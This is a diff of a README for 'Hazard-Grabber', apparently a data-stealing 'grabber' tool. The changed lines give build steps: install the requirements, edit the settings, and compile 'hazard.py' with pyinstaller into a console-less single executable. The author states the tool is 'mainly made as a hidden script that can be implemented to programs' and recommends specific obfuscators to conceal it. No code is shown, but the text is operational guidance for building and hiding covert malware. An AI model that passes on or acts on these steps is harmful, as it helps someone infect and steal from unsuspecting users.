@@ -54,7 +54,7 @@ I'm learning coding at the moment to create my own projects as I mentioned befor
 
 - _Step 2 help > I would recommend you Visual Studio Code._ [You can download it here!](https://code.visualstudio.com/)
 
-- [x] Step 3: Open a command prompt in the directory and run the following command: "py -m pip install -r requirements.txt".
+- [x] Step 3: Open a command prompt in the directory and run the following command: "pip install -r requirements.txt".
 
 
 - _Step 3 help > If you don't know how to open a command prompt in the directory,_ [here is a simple tutorial!](https://www.lifewire.com/open-command-prompt-in-a-folder-5185505)
@@ -66,7 +66,7 @@ I'm learning coding at the moment to create my own projects as I mentioned befor
 
 - [x] Step 5: (optional) You can also change the settings from line 30 to 37. True is enabling the setting, false is disbaling a setting. Easy!
 
-- [x] Step 6: How do I compile this now? That's pretty easy! Just run this command after you opened a command prompt in the Hazard-Grabber Directory and run this command: "pyinstaller --onefile --noconsole hazard.py". Now wait for it to compile the file. It was mainly made as a hidden script that can be implemented to programs, so you can skip this step if you want and just obfuscate the file. I would recommend you [Blanks Obfuscator](https://github.com/Blank-c/BlankOBF) or [addidix Obfuscator](https://github.com/addi00000/pycloak).
+- [x] Step 6: Just run this command in a command prompt which you opened in the Hazard-Grabber Directory. "pyinstaller --onefile --noconsole hazard.py". Now wait for it to compile the file. It was mainly made as a hidden script that can be implemented to programs, so you can skip this step if you want and just obfuscate the file. I would recommend you [Blanks Obfuscator](https://github.com/Blank-c/BlankOBF) or [addidix Obfuscator](https://github.com/addi00000/pycloak).
 
 - [x] Step 7: (optional) Change the Icon. I don't know good programs for this at the moment. I will try to add this soon. If you know how to do this, let me know under the "Issues" ➤➤  "Suggestions" Tab.
 
